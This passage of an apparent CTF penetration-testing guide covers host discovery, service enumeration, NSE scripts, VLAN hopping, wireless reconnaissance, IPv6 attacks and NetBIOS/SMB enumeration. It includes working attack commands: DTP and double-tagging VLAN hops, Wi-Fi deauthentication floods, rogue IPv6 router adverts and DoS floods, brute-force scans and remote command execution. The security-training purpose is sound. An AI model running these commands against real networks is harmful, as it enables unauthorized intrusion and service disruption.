nmap -sn -PR 192.168.1.0/24
```

`-PR` uses ARP requests, which work only on local Ethernet networks. This is the most reliable method for local network discovery since ARP cannot be blocked without breaking network functionality. Nmap automatically uses ARP for local networks unless disabled with `--disable-arp-ping`.

**Combining Multiple Techniques**

```bash
nmap -sn -PE -PS80,443 -PA80,443 -PU53 192.168.1.0/24
```

Combining multiple probe types increases discovery success rates in environments with restrictive filtering.

**Disabling Host Discovery**

```bash
nmap -Pn 192.168.1.50
```

`-Pn` treats all hosts as online and skips host discovery. Use this when you know a host is live but discovery probes are being filtered.

### Alternative Host Discovery Tools

**fping - Fast Parallel Ping**

```bash
fping -a -g 192.168.1.0/24 2>/dev/null
fping -a -f targets.txt
```

`fping` sends ICMP echo requests in parallel, making it faster than sequential ping for large ranges. `-a` shows alive hosts only, `-g` generates target list from range, `-f` reads targets from file.

**hping3 - Custom Packet Crafting**

```bash
hping3 -1 192.168.1.1
hping3 -S -p 80 192.168.1.1
hping3 -A -p 443 192.168.1.1
```

`hping3` allows granular packet crafting. `-1` uses ICMP, `-S` sends SYN packets, `-A` sends ACK packets. Useful for testing specific firewall rules.

**masscan - High-Speed Scanner**

```bash
masscan -p80,443 192.168.1.0/24 --rate 10000
masscan 10.0.0.0/8 -p0-65535 --rate 1000000
```

`masscan` performs extremely fast scans using asynchronous transmission. `--rate` controls packets per second. [Unverified: Claimed speeds up to 25 million packets/second on capable hardware, but actual performance depends on network infrastructure and host capabilities.]

**netdiscover - ARP-Based Discovery**

```bash
netdiscover -i eth0 -r 192.168.1.0/24
netdiscover -i eth0 -p
```

`netdiscover` performs active/passive ARP reconnaissance. `-i` specifies interface, `-r` defines range, `-p` enables passive mode (no ARP requests sent, only listens).

## Service Version Detection

After discovering live hosts, identifying service versions reveals potential vulnerabilities and informs exploit selection.

### Nmap Version Detection

**Basic Version Scanning**

```bash
nmap -sV 192.168.1.50
nmap -sV -p 1-65535 192.168.1.50
```

`-sV` enables version detection. Nmap connects to open ports, sends probes, and analyzes responses to identify service types and versions.

**Version Intensity Control**

```bash
nmap -sV --version-intensity 0 192.168.1.50
nmap -sV --version-intensity 9 192.168.1.50
```

`--version-intensity` ranges from 0-9. Lower values try common probes (faster, less accurate). Higher values try all probes (slower, more accurate). Default is 7.

**Version Light**

```bash
nmap -sV --version-light 192.168.1.50
```

`--version-light` equivalent to `--version-intensity 2`. Uses only most common probes for speed.

**Version All**

```bash
nmap -sV --version-all 192.168.1.50
```

`--version-all` equivalent to `--version-intensity 9`. Tries every probe in Nmap's database.

**Aggressive Scanning**

```bash
nmap -A 192.168.1.50
```

`-A` enables OS detection, version detection, script scanning, and traceroute. Comprehensive but noisy and easily detected.

**Service-Specific Version Detection**

```bash
nmap -sV -p 22 --version-intensity 9 192.168.1.50
```

Focus version detection on specific ports when you need detailed information about a particular service.

### Banner Grabbing Techniques

**netcat Banner Grabbing**

```bash
nc -nv 192.168.1.50 22
nc -nv 192.168.1.50 80
```

Directly connect to services to capture banners. `-n` skips DNS resolution, `-v` enables verbose mode. After connecting, send protocol-specific requests (e.g., type `HEAD / HTTP/1.0` for HTTP).

**Using HTTP Requests**

```bash
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -nv 192.168.1.50 80
curl -I http://192.168.1.50
```

HTTP HEAD requests retrieve server headers containing version information without downloading content.

**Using Specific Protocol Commands**

```bash
echo "QUIT" | nc -nv 192.168.1.50 25  # SMTP
echo "USER test" | nc -nv 192.168.1.50 21  # FTP
```

Send protocol-specific commands to elicit version information from services.

**telnet Banner Grabbing**

```bash
telnet 192.168.1.50 22
telnet 192.168.1.50 25
```

Similar to netcat but provides line-mode interaction. Many services display banners immediately upon connection.

**dmitry - Information Gathering Tool**

```bash
dmitry -pb 192.168.1.50
```

`dmitry` performs TCP port scanning and banner grabbing. `-p` performs port scan, `-b` retrieves banners.

### Service Enumeration Tools

**amap - Application Mapper**

```bash
amap 192.168.1.50 1-1000
amap -bq 192.168.1.50 80 443 8080
```

`amap` identifies applications running on specific ports by sending trigger packets and analyzing responses. `-b` shows banners, `-q` suppresses informational output.

**enum4linux - SMB Enumeration**

```bash
enum4linux -a 192.168.1.50
enum4linux -U -S -G 192.168.1.50
```

`enum4linux` enumerates information from Windows and Samba systems via SMB. `-a` performs all enumeration, `-U` gets user list, `-S` gets share list, `-G` gets group information.

**smbclient - SMB Share Access**

```bash
smbclient -L //192.168.1.50 -N
smbclient //192.168.1.50/share -U username
```

`smbclient` lists and accesses SMB shares. `-L` lists shares, `-N` suppresses password prompt (null session).

**snmpwalk - SNMP Enumeration**

```bash
snmpwalk -v 2c -c public 192.168.1.50
snmpwalk -v 2c -c public 192.168.1.50 1.3.6.1.2.1.1
```

`snmpwalk` retrieves SNMP information. `-v` specifies version, `-c` specifies community string. Common community strings include "public" and "private". The OID `1.3.6.1.2.1.1` retrieves system information.

**onesixtyone - Fast SNMP Scanner**

```bash
onesixtyone -c community.txt -i hosts.txt
onesixtyone 192.168.1.50 public
```

`onesixtyone` brute-forces SNMP community strings. `-c` specifies community string file, `-i` specifies host file.

**SMTP Enumeration**

```bash
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.50
smtp-user-enum -M EXPN -u admin -t 192.168.1.50
```

`smtp-user-enum` verifies SMTP users via VRFY, EXPN, or RCPT commands. `-M` specifies method, `-U` provides username list, `-u` tests single username.

**NFS Enumeration**

```bash
showmount -e 192.168.1.50
rpcinfo -p 192.168.1.50
```

`showmount` displays exported NFS shares. `-e` shows export list. `rpcinfo` queries RPC services.

## Script Scanning (NSE)

Nmap Scripting Engine (NSE) extends Nmap's capabilities with Lua scripts that automate discovery, vulnerability detection, and exploitation tasks.

### NSE Categories

NSE scripts are organized into categories:

- **auth**: Authentication testing
- **broadcast**: Network broadcast discovery
- **brute**: Brute-force attacks
- **default**: Safe, fast scripts run with `-sC`
- **discovery**: Active information gathering
- **dos**: Denial of service tests (use carefully)
- **exploit**: Active exploitation attempts
- **external**: Scripts that contact external resources
- **fuzzer**: Fuzzing attacks
- **intrusive**: Scripts likely to crash services or generate significant traffic
- **malware**: Malware detection
- **safe**: Unlikely to crash services or generate excessive traffic
- **version**: Extended version detection
- **vuln**: Vulnerability detection

### Basic NSE Usage

**Default Scripts**

```bash
nmap -sC 192.168.1.50
nmap --script=default 192.168.1.50
```

`-sC` or `--script=default` runs scripts in the "default" category. These are considered safe and useful for general reconnaissance.

**Category-Based Selection**

```bash
nmap --script=vuln 192.168.1.50
nmap --script=auth,brute 192.168.1.50
nmap --script="not intrusive" 192.168.1.50
```

Run scripts by category. Multiple categories can be comma-separated. Use `not` to exclude categories.

**Specific Script Execution**

```bash
nmap --script=smb-enum-shares 192.168.1.50
nmap --script=http-enum 192.168.1.50
nmap --script=ssl-cert,ssl-enum-ciphers 192.168.1.50
```

Execute specific scripts by name. Multiple scripts can be comma-separated.

**Wildcard Patterns**

```bash
nmap --script="smb-*" 192.168.1.50
nmap --script="http-*" 192.168.1.50
nmap --script="ssh-*" 192.168.1.50
```

Use wildcards to run all scripts matching a pattern.

### Script Arguments

Many NSE scripts accept arguments to customize behavior:

```bash
nmap --script=http-enum --script-args http-enum.displayall=true 192.168.1.50
nmap --script=smb-brute --script-args userdb=users.txt,passdb=passes.txt 192.168.1.50
nmap --script=mysql-brute --script-args "userdb=users.txt,passdb=rockyou.txt,mysql-brute.timeout=5s" 192.168.1.50
```

`--script-args` passes arguments to scripts. Format is `script.arg=value` or `arg=value` for global arguments.

### Common NSE Scripts by Service

**HTTP/HTTPS Scripts**

```bash
nmap --script=http-enum -p 80,443 192.168.1.50
nmap --script=http-headers,http-methods,http-robots.txt -p 80 192.168.1.50
nmap --script=http-shellshock --script-args uri=/cgi-bin/test.sh -p 80 192.168.1.50
nmap --script=http-sql-injection -p 80 192.168.1.50
nmap --script=http-wordpress-enum --script-args search-limit=1000 -p 80 192.168.1.50
```

- `http-enum`: Enumerates common directories and files
- `http-headers`: Retrieves HTTP headers
- `http-methods`: Lists supported HTTP methods
- `http-shellshock`: Tests for Shellshock vulnerability (CVE-2014-6271)
- `http-wordpress-enum`: Enumerates WordPress installations

**SMB Scripts**

```bash
nmap --script=smb-os-discovery 192.168.1.50
nmap --script=smb-enum-shares,smb-enum-users 192.168.1.50
nmap --script=smb-vuln-ms17-010 192.168.1.50
nmap --script=smb-vuln-* 192.168.1.50
```

- `smb-os-discovery`: Determines OS, computer name, domain
- `smb-enum-shares`: Lists SMB shares
- `smb-vuln-ms17-010`: Tests for EternalBlue vulnerability
- `smb-vuln-*`: Runs all SMB vulnerability detection scripts

**SSH Scripts**

```bash
nmap --script=ssh-auth-methods --script-args="ssh.user=root" -p 22 192.168.1.50
nmap --script=ssh-brute --script-args userdb=users.txt,passdb=passes.txt -p 22 192.168.1.50
nmap --script=ssh-hostkey -p 22 192.168.1.50
nmap --script=sshv1 -p 22 192.168.1.50
```

- `ssh-auth-methods`: Lists supported authentication methods
- `ssh-brute`: Performs brute-force authentication
- `ssh-hostkey`: Retrieves SSH host key
- `sshv1`: Checks for deprecated SSH version 1

**DNS Scripts**

```bash
nmap --script=dns-zone-transfer --script-args dns-zone-transfer.domain=example.com -p 53 192.168.1.50
nmap --script=dns-brute --script-args dns-brute.domain=example.com -p 53 192.168.1.50
nmap --script=dns-recursion -p 53 192.168.1.50
```

- `dns-zone-transfer`: Attempts zone transfer (AXFR)
- `dns-brute`: Brute-forces DNS subdomains
- `dns-recursion`: Tests if DNS server allows recursive queries

**Database Scripts**

```bash
nmap --script=mysql-enum -p 3306 192.168.1.50
nmap --script=mysql-empty-password -p 3306 192.168.1.50
nmap --script=ms-sql-info -p 1433 192.168.1.50
nmap --script=oracle-sid-brute -p 1521 192.168.1.50
```

- `mysql-enum`: Enumerates MySQL databases, users, variables
- `mysql-empty-password`: Tests for accounts with empty passwords
- `ms-sql-info`: Retrieves Microsoft SQL Server information
- `oracle-sid-brute`: Brute-forces Oracle SID names

**SSL/TLS Scripts**

```bash
nmap --script=ssl-cert,ssl-enum-ciphers -p 443 192.168.1.50
nmap --script=ssl-heartbleed -p 443 192.168.1.50
nmap --script=ssl-poodle -p 443 192.168.1.50
```

- `ssl-cert`: Retrieves SSL certificate information
- `ssl-enum-ciphers`: Lists supported cipher suites and grades them
- `ssl-heartbleed`: Tests for Heartbleed vulnerability (CVE-2014-0160)
- `ssl-poodle`: Tests for POODLE vulnerability (CVE-2014-3566)

**SNMP Scripts**

```bash
nmap --script=snmp-brute -p 161 192.168.1.50
nmap --script=snmp-info -p 161 192.168.1.50
nmap --script=snmp-interfaces -p 161 192.168.1.50
```

- `snmp-brute`: Brute-forces SNMP community strings
- `snmp-info`: Extracts system information
- `snmp-interfaces`: Lists network interfaces

### NSE Script Management

**Updating Script Database**

```bash
nmap --script-updatedb
```

Updates NSE script database after installing new scripts.

**Finding Scripts**

```bash
locate *.nse | grep http
ls /usr/share/nmap/scripts/ | grep smb
```

NSE scripts are stored in `/usr/share/nmap/scripts/` on Kali Linux.

**Script Documentation**

```bash
nmap --script-help=http-enum
nmap --script-help="smb-*"
```

`--script-help` displays documentation for specified scripts.

### Creating Custom Script Scan Profiles

**Comprehensive Web Application Scan**

```bash
nmap -sV -p 80,443,8080,8443 --script="http-* and not http-slowloris*" 192.168.1.50
```

**Complete SMB Enumeration**

```bash
nmap -sV -p 139,445 --script="smb-enum-*,smb-os-discovery,smb-security-mode" 192.168.1.50
```

**Vulnerability Assessment**

```bash
nmap -sV --script=vuln -p- 192.168.1.0/24
```

**Aggressive Discovery**

```bash
nmap -A --script="default or discovery" 192.168.1.50
```

## Network Topology Mapping

Understanding network topology reveals routing paths, security devices, and network segmentation that inform attack planning.

### Traceroute Techniques

**ICMP Traceroute**

```bash
nmap --traceroute 192.168.1.50
traceroute 192.168.1.50
```

Traditional traceroute using ICMP echo requests. Many networks block ICMP, making this unreliable.

**TCP Traceroute**

```bash
nmap -sS --traceroute 192.168.1.50
tcptraceroute 192.168.1.50 80
```

Uses TCP SYN packets to trace route. `tcptraceroute` specifically sends TCP packets, which are less likely to be filtered than ICMP.

**UDP Traceroute**

```bash
traceroute -U 192.168.1.50
nmap -sU --traceroute -p 53 192.168.1.50
```

Uses UDP packets for tracing. `-U` enables UDP mode in traceroute.

**traceroute with Different Protocols**

```bash
traceroute -I 192.168.1.50  # ICMP
traceroute -T 192.168.1.50  # TCP
traceroute -U -p 53 192.168.1.50  # UDP to specific port
```

### Network Topology Discovery

**Identifying Firewalls and Filters**

```bash
nmap -sA -p 80,443 192.168.1.50
```

`-sA` performs TCP ACK scan. Responses reveal firewall filtering rules. Unfiltered ports return RST, filtered ports show no response or ICMP unreachable.

**OS Detection for Network Devices**

```bash
nmap -O 192.168.1.50
nmap -O --osscan-guess 192.168.1.50
```

`-O` enables OS detection. `--osscan-guess` makes aggressive guesses when detection is uncertain. Network devices often have distinctive TCP/IP stack implementations.

**Identifying Network Devices**

```bash
nmap -sV --script=snmp-info -p 161 192.168.1.0/24
```

SNMP information often reveals device type, model, and role in network.

**Reverse DNS Mapping**

```bash
nmap -sL 192.168.1.0/24
```

`-sL` performs list scan with reverse DNS resolution. Hostnames often indicate device purpose (fw01, router, sw-core).

### Route Discovery

**IPv4 Route Discovery**

```bash
ip route show
route -n
netstat -rn
```

Display local routing table. Reveals directly connected networks and gateway addresses.

**MTR - Enhanced Traceroute**

```bash
mtr 192.168.1.50
mtr -T -P 80 192.168.1.50
```

`mtr` combines traceroute and ping functionality, showing continuous statistics. `-T` uses TCP, `-P` specifies port.

### Network Device Fingerprinting

**Identifying Load Balancers**

```bash
lbd example.com
```

`lbd` (Load Balancing Detector) identifies load balancers by analyzing HTTP headers and behavior.

**Identifying Web Application Firewalls**

```bash
wafw00f http://192.168.1.50
```

`wafw00f` detects web application firewalls by analyzing HTTP responses to crafted requests.

**Identifying Intrusion Detection/Prevention** [Inference: IDS/IPS detection typically involves sending known attack signatures and observing whether connections are blocked, but this can trigger security alerts and is generally noisy.]

### Advanced Topology Mapping

**Subnet Discovery**

```bash
nmap -sn --disable-arp-ping 10.0.0.0/8 | grep "Nmap scan report" | cut -d " " -f 5 | sort -u
```

Discover active subnets within large networks by identifying live hosts across ranges.

**Gateway/Router Identification**

```bash
nmap -sV -p 22,23,80,443,8080 --script=http-title,ssh-hostkey 192.168.1.1
```

Common gateway addresses (.1, .254) often run management interfaces.

**Network Segmentation Analysis**

```bash
nmap -sn 192.168.1.0/24
nmap -sn 192.168.2.0/24
nmap -sn 10.0.0.0/24
```

Scan multiple subnets to identify network segmentation. Inability to reach certain networks indicates firewalls or VLANs.

### Passive Network Mapping

**p0f - Passive OS Fingerprinting**

```bash
p0f -i eth0
p0f -r capture.pcap
```

`p0f` identifies operating systems and network topology by passively analyzing traffic. `-i` specifies interface, `-r` reads from pcap file.

**Wireshark/tshark Analysis**

```bash
tshark -i eth0 -f "tcp or udp"
tshark -r capture.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0"
```

Capture and analyze network traffic to identify hosts, services, and communication patterns without sending active probes.

### Documentation and Visualization

**Recording Scan Results**

```bash
nmap -oA scan_output 192.168.1.0/24
nmap -oX scan.xml 192.168.1.0/24
nmap -oG scan.gnmap 192.168.1.0/24
```

`-oA` outputs in all formats (normal, XML, grepable). `-oX` outputs XML, `-oG` outputs grepable format.

**Converting Nmap XML to HTML**

```bash
xsltproc scan.xml -o scan.html
```

Converts Nmap XML output to readable HTML report.

### Practical Scanning Workflows

**Initial Network Sweep**

```bash
nmap -sn 192.168.1.0/24 -oG hosts.txt
grep "Up" hosts.txt | cut -d " " -f 2 > live_hosts.txt
```

**Comprehensive Service Discovery**

```bash
nmap -sS -sV -O -p- --script=default,vuln -iL live_hosts.txt -oA full_scan
```

**Targeted Service Enumeration**

```bash
nmap -sV -p 80,443 --script="http-*" 192.168.1.50 -oN web_enum.txt
nmap -sV -p 139,445 --script="smb-*" 192.168.1.50 -oN smb_enum.txt
```

---

## Key Considerations for CTF Scenarios

**Stealth vs Speed**: Fast scans (`-T4`, `-T5`) complete quickly but generate significant traffic. Slower scans (`-T2`, `-T1`) evade detection but take longer. Default timing (`-T3`) balances both.

**Port Range Selection**: Full port scans (`-p-`) discover non-standard services but take significantly longer. Focus on common ports initially, expand if needed.

**Privilege Requirements**: SYN scans (`-sS`), OS detection (`-O`), and some other techniques require root privileges. Connect scans (`-sT`) work without root but are more detectable.

**Network Context**: Adjust techniques based on environment. ARP works only locally. Some scans traverse NAT poorly. Aggressive scans may trigger IDS/IPS.

**False Negatives**: Firewalls, rate limiting, and host-based filtering can hide services. Multiple scanning techniques from different source addresses/ports may reveal filtered services.

---

## VLAN Discovery

VLAN discovery identifies virtual network segmentation that may hide critical assets or provide lateral movement opportunities in CTF environments.

### Core Concepts

VLANs (Virtual Local Area Networks) segment networks at Layer 2 using 802.1Q tagging. Discovery techniques identify VLAN IDs, trunk ports, and inter-VLAN routing configurations that might expose unintended network paths.

### Tools & Techniques

**Yersinia** - Layer 2 attack framework for VLAN manipulation

```bash
# Launch interactive mode
yersinia -I

# DTP (Dynamic Trunking Protocol) attack via CLI
yersinia -attack 2 -interface eth0

# Send DTP Desirable packets to negotiate trunk
yersinia dtp -attack 1 -interface eth0
```

**Frogger** - VLAN hopping automation tool

```bash
# Scan for VLAN IDs
frogger.sh -i eth0 -m 1

# Test VLAN hopping on discovered VLANs
frogger.sh -i eth0 -v 10,20,30 -m 2
```

**VoIP Hopper** - VLAN discovery via VoIP protocols

```bash
# Discover voice VLANs using CDP/LLDP
voiphopper -i eth0 -c 1

# Target specific VLAN for hopping
voiphopper -i eth0 -E -V 100
```

**Manual VLAN Probing with vconfig** (deprecated but still functional)

```bash
# Create VLAN interface
vconfig add eth0 10

# Configure interface
ifconfig eth0.10 192.168.10.50 netmask 255.255.255.0 up

# Test connectivity
ping -I eth0.10 192.168.10.1

# Remove VLAN interface
vconfig rem eth0.10
```

**Modern approach with ip command**

```bash
# Create VLAN interface
ip link add link eth0 name eth0.10 type vlan id 10

# Assign IP address
ip addr add 192.168.10.50/24 dev eth0.10

# Bring interface up
ip link set dev eth0.10 up

# Route traffic through VLAN
ip route add 192.168.10.0/24 dev eth0.10
```

### VLAN Hopping Attack Vectors

**Switch Spoofing** - Negotiate trunk mode with switches

```bash
# Use Yersinia to send DTP frames
yersinia -G

# Navigate: Launch Attack â†’ DTP â†’ Send DTP Desirable packet
```

**Double Tagging** - Exploit native VLAN processing

```bash
# Requires custom packet crafting with Scapy
scapy
>>> packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst="192.168.20.10")/ICMP()
>>> sendp(packet, iface="eth0")
```

### Enumeration Methodology

1. **Passive VLAN Discovery**

```bash
# Capture CDP/LLDP/DTP traffic
tcpdump -i eth0 -vvv -s 1500 '(ether[20:2] = 0x2000)'

# Parse CDP frames
tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] = 0x2000'
```

2. **Active VLAN Scanning**

```bash
# Iterate through VLAN ID range (1-4094)
for vlan in {1..100}; do
    ip link add link eth0 name eth0.$vlan type vlan id $vlan
    ip link set dev eth0.$vlan up
    timeout 2 arping -I eth0.$vlan -c 1 192.168.$vlan.1 2>/dev/null && echo "VLAN $vlan: Active"
    ip link del eth0.$vlan
done
```

3. **VLAN Routing Discovery**

```bash
# Identify inter-VLAN routing
nmap --script ip-forwarding 192.168.1.1

# Test routing between VLANs
traceroute -i eth0.10 192.168.20.1
```

---

## Wireless Network Enumeration

Wireless enumeration identifies access points, clients, encryption methods, and attack surfaces in 802.11 networks.

### Interface Preparation

**Enable Monitor Mode**

```bash
# Check wireless interface
iwconfig

# Kill interfering processes
airmon-ng check kill

# Enable monitor mode
airmon-ng start wlan0

# Verify monitor mode (interface becomes wlan0mon)
iwconfig wlan0mon
```

**Alternative method with iw**

```bash
# Disable interface
ip link set wlan0 down

# Set monitor mode
iw wlan0 set monitor control

# Enable interface
ip link set wlan0 up
```

### Active Reconnaissance

**Airodump-ng** - Comprehensive wireless scanner

```bash
# Scan all channels and bands
airodump-ng wlan0mon

# Target specific channel
airodump-ng -c 6 wlan0mon

# Target specific BSSID and write capture
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Filter by encryption type
airodump-ng --encrypt wpa wlan0mon

# 5GHz scanning
airodump-ng --band a wlan0mon
```

**Wash** - WPS-enabled AP detection

```bash
# Scan for WPS-enabled networks
wash -i wlan0mon

# Scan specific channel
wash -i wlan0mon -c 6

# Verbose output
wash -i wlan0mon -C
```

**Kismet** - Advanced wireless detector

```bash
# Launch with web interface (http://localhost:2501)
kismet -c wlan0mon

# Launch without web interface
kismet_server -c wlan0mon

# Console interface
kismet_client
```

### Passive Reconnaissance

**Horst** - Lightweight protocol analyzer

```bash
# Launch interactive mode
horst -i wlan0mon

# Filter specific BSSID
horst -i wlan0mon -B 00:11:22:33:44:55

# Channel hopping disabled
horst -i wlan0mon -C
```

**Wireshark/Tshark** - Packet analysis

```bash
# Capture 802.11 management frames
tshark -i wlan0mon -f "wlan type mgt"

# Filter beacon frames
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x08"

# Extract SSID from beacons
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x08" -T fields -e wlan.ssid
```

### Client Enumeration

**Airodump-ng Station Detection**

```bash
# Show unassociated clients
airodump-ng --output-format csv -w clients wlan0mon

# Parse client MAC addresses
grep -E "^([0-9A-F]{2}:){5}[0-9A-F]{2}" clients-01.csv | awk -F',' '{print $1}'
```

**Aireplay-ng Deauthentication** - Force client association visibility

```bash
# Deauth all clients from AP
aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon

# Deauth specific client
aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

### Hidden SSID Discovery

**Mdk4** - Beacon flooding and probing

```bash
# Probe for hidden SSIDs
mdk4 wlan0mon p -t 00:11:22:33:44:55

# Mass deauthentication to trigger reassociation
mdk4 wlan0mon d -c 6
```

**Aircrack-ng Suite Approach**

```bash
# Capture handshake containing SSID
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w hidden wlan0mon

# Deauth to force reassociation
aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon
```

### Encryption Analysis

**Identify Security Protocols**

- **Open**: No encryption
- **WEP**: Legacy, easily crackable
- **WPA/WPA2-PSK**: Pre-shared key (most common in CTFs)
- **WPA2-Enterprise**: 802.1X authentication
- **WPA3**: Modern SAE-based encryption

```bash
# Display encryption details with airodump-ng output
# Column "ENC" shows: OPN, WEP, WPA, WPA2, WPA3

# Detailed analysis with wash (for WPS)
wash -i wlan0mon -v
```

---

## IPv6 Enumeration

IPv6 enumeration exploits larger address space, auto-configuration mechanisms, and dual-stack misconfigurations often overlooked in network security.

### Interface Configuration

**Verify IPv6 Support**

```bash
# Check IPv6 addresses
ip -6 addr show

# Display IPv6 routing table
ip -6 route show

# Test IPv6 connectivity
ping6 ::1
```

**Enable IPv6 if Disabled**

```bash
# Remove IPv6 disable parameters
# Edit /etc/sysctl.conf and remove:
# net.ipv6.conf.all.disable_ipv6 = 1

# Apply changes
sysctl -p
```

### IPv6 Address Discovery

**Alive6** - ICMPv6 ping sweep

```bash
# Ping entire link-local subnet
alive6 eth0

# Target specific range
alive6 -p 2001:db8::/64 eth0

# Verbose output
alive6 -v eth0
```

**Passive Discovery with ndp/IPv6 Neighbor Cache**

```bash
# View IPv6 neighbor cache
ip -6 neigh show

# Monitor IPv6 neighbor discoveries
watch -n 1 ip -6 neigh show
```

**Nmap IPv6 Scanning**

```bash
# IPv6 ping scan
nmap -6 -sn fe80::1%eth0

# Full port scan on IPv6
nmap -6 -p- 2001:db8::1

# Scan link-local address (requires interface specification)
nmap -6 -sV fe80::a00:27ff:fe4e:66c8%eth0
```

### Router & Network Discovery

**IPv6 Router Solicitation**

```bash
# Send Router Solicitation to discover routers
rdisc6 eth0

# Parse router advertisements
tcpdump -i eth0 -vv 'icmp6 && ip6[40] == 134'
```

**Passive Router Advertisement Monitoring**

```bash
# Capture RAs with tcpdump
tcpdump -i eth0 -n icmp6 and 'ip6[40] = 134'

# Parse with Wireshark filter
# icmpv6.type == 134
```

### THC-IPv6 Suite Tools

**Scan6** - Comprehensive IPv6 scanner

```bash
# Scan local subnet
scan6 -i eth0

# Scan specific prefix
scan6 -p 2001:db8::/64 -i eth0

# Aggressive scan with multiple techniques
scan6 -i eth0 -d
```

**Parasite6** - ARP-like IPv6 address snooping

```bash
# Respond to neighbor solicitations
parasite6 eth0
```

**Fake_Router6** - Rogue router advertisement

```bash
# Advertise fake router
fake_router6 -A 2001:db8::1/64 eth0

# Router advertisement DoS
fake_router6 -R 100 eth0
```

**DOS-New-IPv6** - Resource exhaustion

```bash
# Flood with Neighbor Advertisements
dos-new-ip6 eth0
```

### DNS Enumeration for IPv6

**AAAA Record Queries**

```bash
# Query IPv6 DNS records
dig AAAA example.com

# Reverse lookup
dig -x 2001:db8::1

# Zone transfer attempt
dig AXFR @dns-server example.com AAAA
```

**Enumerate IPv6 via DNS Brute Force**

```bash
# Using fierce
fierce --domain example.com --dns-servers 2001:4860:4860::8888

# Manual subdomain enumeration
for sub in www mail ftp vpn; do
    dig AAAA $sub.example.com +short
done
```

### IPv6-Specific Attack Vectors

**SLAAC Attack** - Rogue IPv6 address assignment

```bash
# Advertise rogue network with fake_router6
fake_router6 -A 2001:db8:bad::/64 eth0

# Monitor for clients configuring addresses
tcpdump -i eth0 icmp6
```

**Neighbor Discovery Spoofing**

```bash
# Craft spoofed Neighbor Advertisement with Scapy
scapy
>>> send(IPv6(dst="ff02::1")/ICMPv6ND_NA(tgt="2001:db8::1", R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr="aa:bb:cc:dd:ee:ff"), iface="eth0")
```

### Dual-Stack Exploitation

**Identify Dual-Stack Hosts**

```bash
# Scan for both IPv4 and IPv6
nmap -6 -4 -sV 192.168.1.0/24

# Compare open ports between stacks
nmap -p- 192.168.1.10 -oG ipv4.txt
nmap -6 -p- fe80::a00:27ff:fe4e:66c8%eth0 -oG ipv6.txt
diff ipv4.txt ipv6.txt
```

**Tunnel Detection**

```bash
# Identify 6to4 tunnels (2002::/16)
nmap -6 -sn 2002::/16

# Identify Teredo tunnels (2001::/32)
nmap -6 -sn 2001:0000::/32
```

---

## NetBIOS Enumeration

NetBIOS enumeration reveals Windows network information including hostnames, domains, shares, users, and services through ports 137-139.

### NetBIOS Fundamentals

NetBIOS operates over TCP/IP via NBT (NetBIOS over TCP/IP) using:

- **UDP 137**: Name service
- **UDP 138**: Datagram service
- **TCP 139**: Session service

### Name Service Enumeration

**Nbtscan** - Fast NetBIOS scanner

```bash
# Scan subnet
nbtscan 192.168.1.0/24

# Verbose output with additional details
nbtscan -v 192.168.1.0/24

# Target specific host
nbtscan 192.168.1.10

# Read targets from file
nbtscan -f targets.txt
```

**Nmblookup** - Samba NetBIOS client

```bash
# Query hostname
nmblookup -A 192.168.1.10

# Find master browser
nmblookup -M workgroup

# Reverse lookup
nmblookup 192.168.1.10

# Query WINS server
nmblookup -U 192.168.1.1 -R hostname
```

**Nmap NSE Scripts**

```bash
# NetBIOS name service scan
nmap -sU -p 137 --script nbstat 192.168.1.0/24

# Comprehensive NetBIOS enumeration
nmap -sV -p 139,445 --script smb-os-discovery,smb-enum-domains,smb-enum-users 192.168.1.10

# Brute force NetBIOS names
nmap --script broadcast-netbios-master-browser
```

### NetBIOS Name Types

|Suffix|Type|Description|
|---|---|---|
|<00>|U|Workstation service|
|<03>|U|Messenger service|
|<20>|U|File server service|
|<1B>|U|Domain master browser|
|<1C>|G|Domain controllers|
|<1D>|U|Master browser|
|<1E>|G|Browser service elections|

**Interpreting nbstat Output**

```bash
# Query NetBIOS names
nbtstat -A 192.168.1.10

# Look for <20> flag indicating file sharing
# Look for <1C> indicating domain controller
```

### SMB/NetBIOS Session Enumeration

**Enum4linux** - Comprehensive Windows enumeration

```bash
# Full enumeration
enum4linux -a 192.168.1.10

# User enumeration only
enum4linux -U 192.168.1.10

# Share enumeration only
enum4linux -S 192.168.1.10

# OS information
enum4linux -o 192.168.1.10

# Policy information
enum4linux -P 192.168.1.10

# With credentials
enum4linux -u administrator -p password -a 192.168.1.10
```

**Smbclient** - SMB connection client

```bash
# List shares (null session)
smbclient -L //192.168.1.10 -N

# Connect to specific share
smbclient //192.168.1.10/share -U username

# List shares with credentials
smbclient -L //192.168.1.10 -U domain\\username

# Execute commands non-interactively
smbclient //192.168.1.10/share -N -c 'ls'
```

**Rpcclient** - RPC enumeration

```bash
# Connect with null session
rpcclient -U "" -N 192.168.1.10

# Common commands within rpcclient:
# enumdomusers - List domain users
# enumdomgroups - List domain groups
# queryuser <RID> - Get user details
# querygroupmem <RID> - Get group membership
# srvinfo - Server information
# netshareenum - Enumerate shares
# netshareenumall - Enumerate all shares
```

**Example rpcclient Session**

```bash
rpcclient -U "" -N 192.168.1.10
rpcclient $> srvinfo
rpcclient $> enumdomusers
rpcclient $> queryuser 0x1f4
rpcclient $> netshareenum
rpcclient $> quit
```

### CrackMapExec for NetBIOS/SMB

```bash
# SMB enumeration
crackmapexec smb 192.168.1.0/24

# List shares
crackmapexec smb 192.168.1.10 --shares

# Enumerate users
crackmapexec smb 192.168.1.10 --users

# Spider shares
crackmapexec smb 192.168.1.10 -u username -p password --spider C$ --pattern txt

# Execute commands
crackmapexec smb 192.168.1.10 -u username -p password -x whoami
```

### Null Session Exploitation

**Testing for Null Sessions**

```bash
# Test with smbclient
smbclient -L //192.168.1.10 -N

# Test with rpcclient
rpcclient -U "" -N 192.168.1.10

# Test with enum4linux
enum4linux -n 192.168.1.10
```

